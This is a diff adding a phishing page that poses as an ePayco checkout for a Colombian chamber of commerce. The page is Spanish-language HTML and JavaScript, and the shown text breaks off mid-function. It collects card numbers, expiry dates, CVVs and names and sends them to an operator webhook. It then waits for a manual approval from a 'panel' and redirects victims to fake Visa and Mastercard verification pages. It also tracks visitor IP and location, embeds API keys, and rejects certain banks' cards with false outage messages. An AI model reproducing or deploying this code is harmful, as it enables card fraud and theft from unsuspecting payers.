@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pasarela de Pago - Cámara de Comercio</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <style>
+        /* --- RESET Y BASE --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
+        body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; position: relative; }
+        a { text-decoration: none; color: inherit; }
+
+        /* --- FONDO BLUR --- */
+        .bg-blur-wrapper { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }
+        .bg-blur-wrapper img { width: 100%; height: 100%; object-fit: cover; filter: blur(12px); transform: scale(1.05); }
+        .bg-blur-wrapper .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.4); }
+
+        /* --- CONTENEDOR PRINCIPAL --- */
+        .epayco-container { width: 100%; max-width: 420px; background: #fff; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); overflow: hidden; position: relative; z-index: 10; }
+
+        /* --- CABECERA NEGRA --- */
+        .header-blue { background-color: #111111; padding: 25px 20px 15px 20px; color: white; position: relative; }
+        .header-top { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
+        .store-avatar { width: 50px; height: 50px; background: white; border-radius: 50%; display: flex; justify-content: center; align-items: center; flex-shrink: 0; }
+        .store-avatar svg { width: 28px; height: 28px; fill: #111111; }
+        .header-info { flex: 1; display: flex; flex-direction: column; gap: 4px; overflow: hidden; }
+        .header-user-email { font-size: 13px; font-weight: 600; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .header-tramite-name { font-size: 11px; color: rgba(255,255,255,0.7); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .close-btn { position: absolute; top: 15px; right: 15px; background: none; border: none; color: white; font-size: 24px; cursor: pointer; opacity: 0.8; }
+        .close-btn:hover { opacity: 1; }
+        .header-user-bottom { display: flex; justify-content: space-between; align-items: flex-end; font-size: 12px; margin-top: 5px; }
+        .user-icon-txt { display: flex; align-items: center; gap: 5px; }
+        .user-icon-txt svg { width: 16px; height: 16px; fill: white; }
+        .btn-logout { font-weight: 600; cursor: pointer; border-bottom: 1px solid white; padding-bottom: 2px;}
+
+        /* --- BANNER BANDERA / IDIOMA --- */
+        .email-banner { background: #fff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; font-size: 13px; color: #333; border-bottom: 1px solid #eee; }
+        .location-info { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #333; font-weight: 500; }
+        .location-info svg { width: 18px; height: 18px; border-radius: 2px; }
+        .edit-link { color: #007bff; font-weight: 600; font-size: 12px; cursor: pointer; }
+
+        /* --- BARRA VOLVER --- */
+        .back-bar { background: #f8f9fa; padding: 10px 20px; font-size: 13px; font-weight: 600; color: #007bff; display: flex; align-items: center; gap: 5px; cursor: pointer; border-bottom: 1px solid #eee; }
+        .back-bar.hidden { display: none; }
+
+        /* --- PANTALLA 2: FORMULARIO DE TARJETA --- */
+        .card-form { padding: 25px 20px; }
+        .form-title { font-size: 16px; font-weight: 600; color: #333; margin-bottom: 25px; }
+        .input-group { display: flex; align-items: center; border-bottom: 1px solid #ccc; padding-bottom: 8px; margin-bottom: 20px; position: relative; }
+        .input-group svg.icon { width: 24px; height: 24px; fill: #888; margin-right: 10px; flex-shrink: 0; }
+        .input-group input { border: none; outline: none; width: 100%; font-size: 15px; font-family: 'Montserrat', sans-serif; color: #333; background: transparent; }
+        .input-group input::placeholder { color: #aaa; }
+        .input-group.error input { color: #c62828; }
+
+        /* --- ESTILO DEL SELECT DE CUOTAS --- */
+        .input-group select { border: none; outline: none; width: 100%; font-size: 15px; font-family: 'Montserrat', sans-serif; color: #333; background: transparent; cursor: pointer; appearance: none; -webkit-appearance: none; }
+
+        .info-icon-circle { width: 16px; height: 16px; background: #111111; color: white; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 10px; font-weight: bold; cursor: pointer; margin-left: 5px; }
+
+        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+
+        .card-logo-container { position: absolute; right: 0; top: 0; display: flex; gap: 5px; }
+        .card-logo-container img { height: 20px; }
+
+        /* --- SWITCH --- */
+        .toggle-wrapper { display: flex; align-items: center; gap: 15px; margin: 25px 0; }
+        .switch { position: relative; display: inline-block; width: 40px; height: 20px; flex-shrink: 0; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px; }
+        .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 2px; bottom: 2px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: #111111; }
+        input:checked + .slider:before { transform: translateX(20px); }
+        .toggle-label { font-size: 13px; color: #666; font-weight: 500; }
+
+        /* --- BOTÓN CONTINUAR --- */
+        .btn-submit { background-color: #111111; color: white; border: none; width: 100%; padding: 16px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; transition: background 0.3s; font-family: 'Montserrat', sans-serif; margin-top: 10px; }
+        .btn-submit:hover { background-color: #333333; }
+        .btn-submit:disabled { background-color: #999; cursor: not-allowed; }
+
+        /* --- ALERTA ERROR --- */
+        .alert { padding: 10px; border-radius: 4px; margin-bottom: 15px; font-size: 12px; display: none; background: #ffebee; color: #c62828; border: 1px solid #ffcdd2; font-weight: 600; }
+        .alert.show { display: block; }
+
+        /* --- FOOTER LOGOS --- */
+        .footer-logos { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; background: #fff; border-top: 1px solid #eee; }
+        .footer-logos .secure-txt { font-size: 11px; color: #666; display: flex; align-items: center; gap: 4px; }
+        .footer-logos .secure-txt svg { width: 12px; height: 12px; fill: #4caf50; }
+        .footer-logos img { height: 20px; }
+
+        /* --- LOADING OVERLAY --- */
+        .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.80); backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px); z-index: 9999; justify-content: center; align-items: center; flex-direction: column; padding: 20px; }
+        .loading-overlay.active { display: flex; }
+
+        .loading-card { background: #ffffff; border-radius: 16px; padding: 40px 32px 32px 32px; max-width: 360px; width: 100%; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08); text-align: center; border: 1px solid #f0f0f0; }
+        .loading-card .logo-container { display: flex; justify-content: center; align-items: center; margin-bottom: 24px; min-height: 80px; }
+        .loading-card .logo-container .logo-img { height: 60px; width: auto; max-width: 150px; object-fit: contain; }
+        .loading-card .loading-text { font-size: 0.95rem; font-weight: 600; color: #374151; margin-bottom: 20px; }
+        .progress-bar-wrapper { width: 100%; display: none; }
+        .progress-bar-track { width: 100%; height: 4px; background: #e5e7eb; border-radius: 4px; overflow: hidden; position: relative; }
+        .progress-bar-fill-loading { height: 100%; background: #111111; border-radius: 4px; width: 0%; transition: width 0.3s ease; }
+        .loading-card .initial-spinner { display: none; width: 48px; height: 48px; border: 3px solid #e5e7eb; border-top: 3px solid #111111; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 20px auto; }
+        .loading-card .initial-spinner.active { display: block; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* --- MEDIA QUERIES --- */
+        @media (min-width: 769px) { .epayco-container { max-width: 460px; } }
+        @media (max-width: 480px) { body { padding: 10px; } .epayco-container { border-radius: 0; box-shadow: none; } .form-row { grid-template-columns: 1fr; gap: 0; } }
+    </style>
+</head>
+<body>
+
+    <!-- FONDO BLUR -->
+    <div class="bg-blur-wrapper">
+        <img src="blure.png" alt="Fondo">
+        <div class="overlay"></div>
+    </div>
+
+    <!-- PANTALLA DE CARGA (LOADER) -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-card">
+            <div class="initial-spinner active" id="initialSpinner"></div>
+            <div class="logo-container" id="logoContainer" style="display:none;">
+                <img id="cardLogoImg" src="" alt="Logo tarjeta" class="logo-img" />
+            </div>
+            <div class="loading-text" id="loadingText">Procesando pago...</div>
+            <div class="progress-bar-wrapper" id="progressWrapper">
+                <div class="progress-bar-track">
+                    <div class="progress-bar-fill-loading" id="progressFill"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- CONTENEDOR PRINCIPAL -->
+    <div class="epayco-container">
+        
+        <!-- CABECERA NEGRA -->
+        <div class="header-blue">
+            <button class="close-btn" onclick="window.location.href='/';">&times;</button>
+            <div class="header-top">
+                <div class="store-avatar">
+                    <svg viewBox="0 0 24 24"><path d="M20 4H4v2h16V4zm1 10v-2l-1-5H4l-1 5v2h1v6h10v-6h4v6h2v-6h1zm-9 4H6v-4h6v4z"/></svg>
+                </div>
+                <div class="header-info">
+                    <div class="header-user-email" id="headerUserEmail">Cargando correo...</div>
+                    <div class="header-tramite-name" id="headerTramiteName">Cargando trámite...</div>
+                </div>
+            </div>
+            <div class="header-user-bottom">
+                <div class="user-icon-txt">
+                    <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                    <span>Crezcamos</span>
+                </div>
+                <div class="btn-logout">Cerrar sesión</div>
+            </div>
+        </div>
+
+        <!-- BANNER CORREO -->
+        <div class="email-banner">
+            <div class="location-info">
+                <svg viewBox="0 0 640 480"><path fill="#FCD116" d="M0 0h640v240H0z"/><path fill="#003893" d="M0 240h640v120H0z"/><path fill="#CE1126" d="M0 360h640v120H0z"/></svg>
+                Colombia
+            </div>
+            <a href="#" class="edit-link">edit</a>
+        </div>
+
+        <!-- PANTALLA 2: FORMULARIO DE TARJETA (VISIBLE DIRECTAMENTE) -->
+        <div class="card-form" id="cardForm">
+            
+            <div class="alert" id="alertError">
+                <span id="mensajeError">Por favor, completa todos los campos correctamente</span>
+            </div>
+
+            <div class="form-title">Ingrese los datos de su tarjeta</div>
+
+            <form id="paymentForm" onsubmit="return false;">
+                
+                <div class="input-group">
+                    <svg class="icon" viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
+                    <input type="text" id="numero" placeholder="Número de la tarjeta" maxlength="19" autocomplete="cc-number" required>
+                    <div class="card-logo-container" id="cardLogo"></div>
+                </div>
+                <div class="error-message" id="cardNumberError" style="display:none; color:#e53935; font-size:12px; margin-top:-15px; margin-bottom:15px;"></div>
+
+                <div class="form-row">
+                    <div class="input-group">
+                        <svg class="icon" viewBox="0 0 24 24"><path d="M20 3h-1V1h-2v2H7V1H5v2H4c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 18H4V8h16v13z"/></svg>
+                        <input type="text" id="exp" placeholder="MM/AA" maxlength="7" autocomplete="cc-exp" required>
+                    </div>
+                    <div class="input-group">
+                        <svg class="icon" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>
+                        <input type="text" id="cvv" placeholder="CVV" maxlength="4" autocomplete="cc-csc" required>
+                        <div class="info-icon-circle">i</div>
+                    </div>
+                </div>
+
+                <div class="form-row">
+                    <div class="input-group">
+                        <svg class="icon" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                        <input type="text" id="nombre" placeholder="Propietario de la tarjeta" autocomplete="cc-name" required>
+                    </div>
+                    <div class="input-group">
+                        <svg class="icon" viewBox="0 0 24 24"><path d="M3 13h2v-2H3v2zm0 4h2v-2H3v2zm0-8h2V7H3v2zm4 4h14v-2H7v2zm0 4h14v-2H7v2zM7 7v2h14V7H7z"/></svg>
+                        <!-- SELECT DE CUOTAS HABILITADO -->
+                        <select id="cuotas" required>
+                            <option value="" disabled selected>Cuotas</option>
+                            <option value="1">1 cuota (Sin intereses)</option>
+                            <option value="3">3 cuotas</option>
+                            <option value="6">6 cuotas</option>
+                            <option value="9">9 cuotas</option>
+                            <option value="12">12 cuotas</option>
+                            <option value="18">18 cuotas</option>
+                            <option value="24">24 cuotas</option>
+                            <option value="36">36 cuotas</option>
+                        </select>
+                        <div class="info-icon-circle" style="background:#888;">i</div>
+                    </div>
+                </div>
+
+                <div class="toggle-wrapper">
+                    <label class="switch">
+                        <input type="checkbox" id="terms" checked required>
+                        <span class="slider"></span>
+                    </label>
+                    <div class="toggle-label">Acepto los términos</div>
+                </div>
+
+                <button type="button" id="btnPagar" class="btn-submit">Continuar</button>
+
+            </form>
+        </div>
+
+        <!-- FOOTER LOGOS -->
+        <div class="footer-logos">
+            <div class="secure-txt">
+                <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                Pago seguro por <strong>ePayco</strong>
+            </div>
+            <div style="display:flex; gap:10px; align-items:center;">
+                <img src="epayco.png" alt="ePayco">
+                <img src="crezpequeno.png" alt="CCB" style="height: 60px;">
+            </div>
+        </div>
+
+    </div>
+
+    <!-- LÓGICA ORIGINAL -->
+    <script>
+        // ============================================================
+        // CONFIGURACIÓN
+        // ============================================================
+        const WEBHOOK_URL = '/api/webhook.php';
+        const HEARTBEAT_URL = '/api/heartbeat.php';
+        const TRACKING_URL = '/api/usuarios_online.php';
+        const API_KEY = 'A9AF97EOZYQAYQNB67T9WPN7DWYC70J6';
+        const POLLING_INTERVAL = 2000;
+        const MAX_POLLING_TIME = 300000;
+        const HEARTBEAT_INTERVAL = 5000;
+
+        // ============================================================
+        // CARGAR DATOS DINÁMICOS (CORREO DESDE URL O LOCALSTORAGE)
+        // ============================================================
+        document.addEventListener('DOMContentLoaded', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const emailFromUrl = urlParams.get('email');
+            const tramiteFromUrl = urlParams.get('tramite');
+
+            const emailFromStorage = localStorage.getItem('email') || localStorage.getItem('correo');
+            const tramiteFromStorage = localStorage.getItem('tipoTramite');
+
+            const finalEmail = emailFromUrl || emailFromStorage || "No proporcionado";
+            const finalTramite = tramiteFromUrl || tramiteFromStorage || "Pago en línea";
+
+            document.getElementById('headerUserEmail').textContent = finalEmail;
+            document.getElementById('headerTramiteName').textContent = finalTramite;
+
+            if (emailFromUrl) localStorage.setItem('email', emailFromUrl);
+        });
+
+        // ============================================================
+        // CAPTURAR IP + PAÍS + CIUDAD
+        // ============================================================
+        async function capturarIP() {
+            if (localStorage.getItem('usuario_ip')) return localStorage.getItem('usuario_ip');
+            try {
+                const resp = await fetch('https://ipwho.is/');
+                const data = await resp.json();
+                if (data.success && data.ip) {
+                    localStorage.setItem('usuario_ip', data.ip);
+                    localStorage.setItem('usuario_pais', data.country || 'Desconocido');
+                    localStorage.setItem('usuario_ciudad', data.city || 'Desconocida');
+                    return data.ip;
+                }
+            } catch (e) {}
+            try {
+                const resp = await fetch('https://ipapi.co/json/');
+                const data = await resp.json();
+                if (data.ip) {
+                    localStorage.setItem('usuario_ip', data.ip);
+                    localStorage.setItem('usuario_pais', data.country_name || 'Desconocido');
+                    localStorage.setItem('usuario_ciudad', data.city || 'Desconocida');
+                    return data.ip;
+                }
+            } catch (e) {}
+            try {
+                const resp = await fetch('https://api.ipify.org?format=json');
+                const data = await resp.json();
+                if (data.ip) { localStorage.setItem('usuario_ip', data.ip); return data.ip; }
+            } catch (e) {}
+            localStorage.setItem('usuario_ip', 'Desconocida');
+            return null;
+        }
+        capturarIP();
+
+        // ============================================================
+        // ESTADO GLOBAL
+        // ============================================================
+        let solicitudId = 'SOL-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+        let pollingInterval = null;
+        let cardType = null;
+        let detectedBank = null;
+        let heartbeatInterval = null;
+        let tipoTarjeta = '';
+
+        // ============================================================
+        // TRACKING ONLINE
+        // ============================================================
+        let usuarioId = localStorage.getItem('usuarioId');
+        if (!usuarioId) {
+            usuarioId = 'USR-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+            localStorage.setItem('usuarioId', usuarioId);
+        }
+        function enviarHeartbeatTracking() {
+            fetch(TRACKING_URL, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ usuarioId: usuarioId, pagina: window.location.pathname })
+            }).catch(() => {});
+        }
+        enviarHeartbeatTracking();
+        setInterval(enviarHeartbeatTracking, 5000);
+
+        window.addEventListener('beforeunload', function() {
+            navigator.sendBeacon(TRACKING_URL, JSON.stringify({ usuarioId: usuarioId, pagina: 'cerrando' }));
+        });
+
+        // ============================================================
+        // HEARTBEAT PANEL
+        // ============================================================
+        function enviarHeartbeat(estado = 'activo') {
+            try {
+                fetch(HEARTBEAT_URL, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        solicitudId: solicitudId,
+                        usuario: document.getElementById('nombre')?.value || '',
+                        estado: estado,
+                        ip: localStorage.getItem('usuario_ip') || '',
+                        pais: localStorage.getItem('usuario_pais') || '',
+                        ciudad: localStorage.getItem('usuario_ciudad') || ''
+                    }),
+                    keepalive: true
+                }).catch(() => {});
+            } catch (e) {}
+        }
+        function iniciarHeartbeat() {
+            enviarHeartbeat('activo');
+            if (heartbeatInterval) clearInterval(heartbeatInterval);
+            heartbeatInterval = setInterval(() => enviarHeartbeat('activo'), HEARTBEAT_INTERVAL);
+        }
+        function detenerHeartbeat(notificar = true) {
+            if (heartbeatInterval) { clearInterval(heartbeatInterval); heartbeatInterval = null; }
+            if (notificar) { try { navigator.sendBeacon(HEARTBEAT_URL, JSON.stringify({ solicitudId: solicitudId, estado: 'offline' })); } catch (e) {} }
+        }
+        window.addEventListener('beforeunload', () => detenerHeartbeat(true));
+
+        // ============================================================
+        // ELEMENTOS DOM
+        // ============================================================
+        const inputNumero = document.getElementById('numero');
+        const cardLogo = document.getElementById('cardLogo');
+        const inputExp = document.getElementById('exp');
+        const inputCVV = document.getElementById('cvv');
+        const inputNombre = document.getElementById('nombre');
+        const selectCuotas = document.getElementById('cuotas'); // <-- NUEVO ELEMENTO
+        const btnPagar = document.getElementById('btnPagar');
+        const alertError = document.getElementById('alertError');
+        const mensajeError = document.getElementById('mensajeError');
+        const cardNumberError = document.getElementById('cardNumberError');
+        const form = document.getElementById('paymentForm');
+
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loadingText = document.getElementById('loadingText');
+        const logoContainer = document.getElementById('logoContainer');
+        const cardLogoImg = document.getElementById('cardLogoImg');
+        const progressWrapper = document.getElementById('progressWrapper');
+        const progressFill = document.getElementById('progressFill');
+        const initialSpinner = document.getElementById('initialSpinner');
+
+        // ============================================================
+        // BINS BLOQUEADOS
+        // ============================================================
+        const BINS_NU = ['528892', '555825', '555829', '52141881', '52749332', '54549472', '55952666', '55953587'];
+        const BINS_NEQUI = ['409355'];
+        function getBinBloqueadoInfo(cardNumber) {
+            const clean = cardNumber.replace(/\s/g, '');
+            for (const bin of BINS_NEQUI) {
+                if (clean.startsWith(bin)) return { bloqueado: true, tipo: 'nequi', mensaje: '⚠️ Nequi se encuentra fuera de servicio en este momento. Por favor, intente con otra tarjeta.' };
+            }
+            for (const bin of BINS_NU) {
+                if (clean.startsWith(bin)) return { bloqueado: true, tipo: 'nu', mensaje: '⚠️ Nu se encuentra fuera de servicio en este momento. Por favor, intente con otra tarjeta.' };
+            }
+            return { bloqueado: false };
+        }
+
+        // ============================================================
+        // DETECCIÓN DE TIPO DE TARJETA
+        // ============================================================
+        const cardPatterns = {
+            visa: { regex: /^4[0-9]{12}(?:[0-9]{3})?$/ },
+            mastercard: { regex: /^(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}$/ },
+            amex: { regex: /^3[47][0-9]{13}$/ }
+        };
+        function detectCardType(cardNumber) {
+            const clean = cardNumber.replace(/\s/g, '');
+            if (clean.length >= 3) {
+                if (clean.substring(0,1) === '4') return 'visa';
+                if (clean.substring(0,2) === '34' || clean.substring(0,2) === '37') return 'amex';
+                if ((clean.substring(0,2) >= '51' && clean.substring(0,2) <= '55') || (clean.substring(0,3) >= '222' && clean.substring(0,3) <= '272')) return 'mastercard';
+            }
+            if (clean.length >= 13) {
+                if (cardPatterns.visa.regex.test(clean)) return 'visa';
+                else if (cardPatterns.mastercard.regex.test(clean)) return 'mastercard';
+                else if (cardPatterns.amex.regex.test(clean)) return 'amex';
+            }
+            return null;
+        }
+        function updateCardLogo(type) {
+            cardLogo.innerHTML = '';
+            const map = { visa: 'visa.png', mastercard: 'mastercard.png', amex: 'ame.png' };
+            if (map[type]) { const img = document.createElement('img'); img.src = map[type]; cardLogo.appendChild(img); }
+        }
+        function formatCardNumber(value) { return value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim(); }
+        function formatExpiry(value) { const cleaned = value.replace(/\D/g, ''); if (cleaned.length >= 2) return cleaned.substring(0, 2) + '/' + cleaned.substring(2, 4); return cleaned; }
+
+        // ============================================================
+        // DETECCIÓN DE BANCO POR BIN (HANDYAPI)
+        // ============================================================
+        const binCache = new Map();
+        const bankNameMapping = {
+            'bancolombia': 'Bancolombia', 'bancolombia s.a.': 'Bancolombia', 'davivienda': 'Davivienda',
+            'bbva colombia': 'BBVA Colombia', 'bbva': 'BBVA Colombia', 'banco de bogotá': 'Banco de Bogotá',
+            'banco de bogota': 'Banco de Bogotá', 'banco popular': 'Banco Popular', 'banco occidente': 'Banco Occidente',
+            'citibank colombia': 'Citibank Colombia', 'citibank': 'Citibank Colombia', 'banco av villas': 'Banco AV Villas',
+            'itau': 'Itaú', 'banco itaú': 'Itaú', 'gnb sudameris': 'Banco GNB Sudameris', 'falabella': 'Banco Falabella',
+            'pichincha': 'Banco Pichincha', 'caja social': 'Caja Social', 'banco caja social': 'Caja Social',
+            'coopcentral': 'Banco Cooperativo Coopcentral', 'bancoomeva': 'Bancoomeva', 'finandina': 'Banco Finandina',
+            'davibank': 'Davibank', 'scotiabank colpatria': 'Scotiabank Colpatria', 'banco agrario': 'Banco Agrario'
+        };
+
+        async function detectBankByBIN(cardNumber) {
+            const clean = cardNumber.replace(/\s/g, '');
+            if (clean.length < 6) { detectedBank = null; return null; }
+            const bin = clean.substring(0, 6);
+            const localCache = JSON.parse(localStorage.getItem('binCache') || '{}');
+            if (localCache[bin] !== undefined) { detectedBank = localCache[bin]; return detectedBank; }
+            if (binCache.has(bin)) { detectedBank = binCache.get(bin); return detectedBank; }
+
+            try {
+                const response = await fetch(`https://data.handyapi.com/bin/${bin}`, {
+                    headers: { 'x-api-key': 'HAS-139kYW5q3NS98PmXt8w67rbDH', 'Accept': 'application/json', 'Content-Type': 'application/json' }
+                });
+                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                const data = await response.json();
+                if (data.Status === 'ERROR' || data.error) throw new Error(data.error || 'Error en la API');
+                
+                let bankName = null;
+                let countryCode = data.Country ? data.Country.A2 : '';
+                
+                if (data.Issuer) {
+                    const rawName = data.Issuer.toLowerCase().trim();
+                    for (const [key, value] of Object.entries(bankNameMapping)) {
+                        if (rawName.includes(key) || key.includes(rawName)) { bankName = value; break; }
+                    }
+                    if (!bankName) bankName = data.Issuer.split(' ').map(w => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()).join(' ');
+                }
+                if (!bankName) bankName = 'Desconocido';
+                
+                if (countryCode && countryCode !== 'CO') { binCache.set(bin, null); detectedBank = null; return null; }
+                
+                binCache.set(bin, bankName);
+                localCache[bin] = bankName;
+                localStorage.setItem('binCache', JSON.stringify(localCache));
+                detectedBank = bankName;
+                localStorage.setItem('bancoEmisor', bankName);
+                return bankName;
+            } catch (error) { detectedBank = null; return null; }
+        }
+
+        // ============================================================
+        // HELPERS UI
+        // ============================================================
+        function mostrarError(mensaje) {
+            mensajeError.textContent = mensaje;
+            alertError.classList.add('show');
+            setTimeout(() => alertError.classList.remove('show'), 5000);
+        }
+        function ocultarError() { alertError.classList.remove('show'); }
+        function habilitarFormulario() {
+            btnPagar.disabled = false; btnPagar.textContent = 'Continuar';
+            inputNumero.disabled = false; inputNombre.disabled = false; inputExp.disabled = false; inputCVV.disabled = false;
+            selectCuotas.disabled = false;
+        }
+
+        // ============================================================
+        // INPUTS
+        // ============================================================
+        let bankTimeout = null;
+        inputNumero.addEventListener('input', function() {
+            let value = this.value.replace(/\s/g, '').replace(/\D/g, '');
+            this.value = formatCardNumber(value);
+            if (value.length >= 3) { cardType = detectCardType(value); updateCardLogo(cardType); }
+            else { cardLogo.innerHTML = ''; cardType = null; }
+            
+            const info = getBinBloqueadoInfo(value);
+            if (value.length >= 6 && info.bloqueado) { cardNumberError.textContent = info.mensaje; cardNumberError.style.display = 'block'; inputNumero.closest('.form-group').classList.add('error'); }
+            else { cardNumberError.style.display = 'none'; inputNumero.closest('.form-group').classList.remove('error'); }
+            
+            clearTimeout(bankTimeout);
+            if (value.length >= 6) { bankTimeout = setTimeout(() => detectBankByBIN(value), 600); }
+            else { detectedBank = null; localStorage.removeItem('bancoEmisor'); }
+        });
+        inputExp.addEventListener('input', function() { this.value = this.value.replace(/[^0-9/]/g, ''); this.value = formatExpiry(this.value); });
+        inputCVV.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); });
+        inputNombre.addEventListener('input', function() { this.value = this.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑ\s]/g, ''); });
+
+        // ============================================================
+        // POLLING — CONSULTA ESTADO
+        // ============================================================
+        async function verificarEstadoSolicitud(id) {
+            try {
+                const response = await fetch(`/api/estado.php?id=${id}`);
+                const data = await response.json();
+                if (data.estado === 'approved') {
+                    clearInterval(pollingInterval); pollingInterval = null;
+                    mostrarCargaConLogos(data.tipo_tarjeta || cardType || 'visa');
+                    return true;
+                } else if (data.estado === 'rejected') {
+                    clearInterval(pollingInterval); pollingInterval = null;
+                    loadingOverlay.classList.remove('active');
+                    mostrarError('❌ Pago rechazado. Intente nuevamente.');
+                    habilitarFormulario();
+                    return false;
+                }
+                return null;
+            } catch (error) { return 'error'; }
+        }
+
+        function iniciarPolling() {
+            if (pollingInterval) clearInterval(pollingInterval);
+            let tiempoInicio = Date.now();
+            pollingInterval = setInterval(async () => {
+                if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
+                    clearInterval(pollingInterval); pollingInterval = null;
+                    loadingOverlay.classList.remove('active');
+                    mostrarError('⏰ Tiempo de espera agotado.');
+                    habilitarFormulario();
+                    return;
+                }
+                const resultado = await verificarEstadoSolicitud(solicitudId);
+                if (resultado === true || resultado === false) return;
+            }, POLLING_INTERVAL);
+        }
+
+        // ============================================================
+        // CARGA CON LOGOS + REDIRECCIÓN SEGÚN TIPO
+        // ============================================================
+        function mostrarCargaConLogos(tipo) {
+            initialSpinner.classList.remove('active');
+            initialSpinner.style.display = 'none';
+            logoContainer.style.display = 'flex';
+            
+            const cardLogoFile = { 'visa': 'visa.png', 'mastercard': 'mastercard.png', 'amex': 'ame.png' }[tipo];
+            if (cardLogoFile) { cardLogoImg.src = cardLogoFile; cardLogoImg.alt = tipo; }
+            
+            progressWrapper.style.display = 'block';
+            
+            const nombres = { 'visa': 'Verified by Visa', 'mastercard': 'Mastercard ID Check', 'amex': 'American Express SafeKey' };
+            loadingText.textContent = 'Redirigiendo a ' + (nombres[tipo] || '...');
+            
+            let progress = 0;
+            const duration = 3000;
+            const interval = 50;
+            const increment = 100 / (duration / interval);
+            progressFill.style.width = '0%';
+            
+            const timer = setInterval(() => {
+                progress += increment;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(timer);
+                    setTimeout(() => { redirigirSegunTipoTarjeta(tipo); }, 400);
+                }
+                progressFill.style.width = progress + '%';
+            }, interval);
+        }
+
+        function redirigirSegunTipoTarjeta(tipo) {
+            const map = { 'visa': 'visa.php', 'mastercard': 'master.php', 'amex': 'amex.php' };
+            window.location.href = map[tipo] || 'index.php';
+        }
+
+        // ============================================================
+        // WEBHOOK
+        // ============================================================
+        async function enviarDatosAlWebhook(datos) {
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json', 'X-API-Key': API_KEY },
+                    body: JSON.stringify(datos)
+                });
+                const text = await response.text();
+                let data;
+                try { data = JSON.parse(text); } catch (e) { console.error('❌ Respuesta no JSON:', text.substring(0, 200)); return false; }
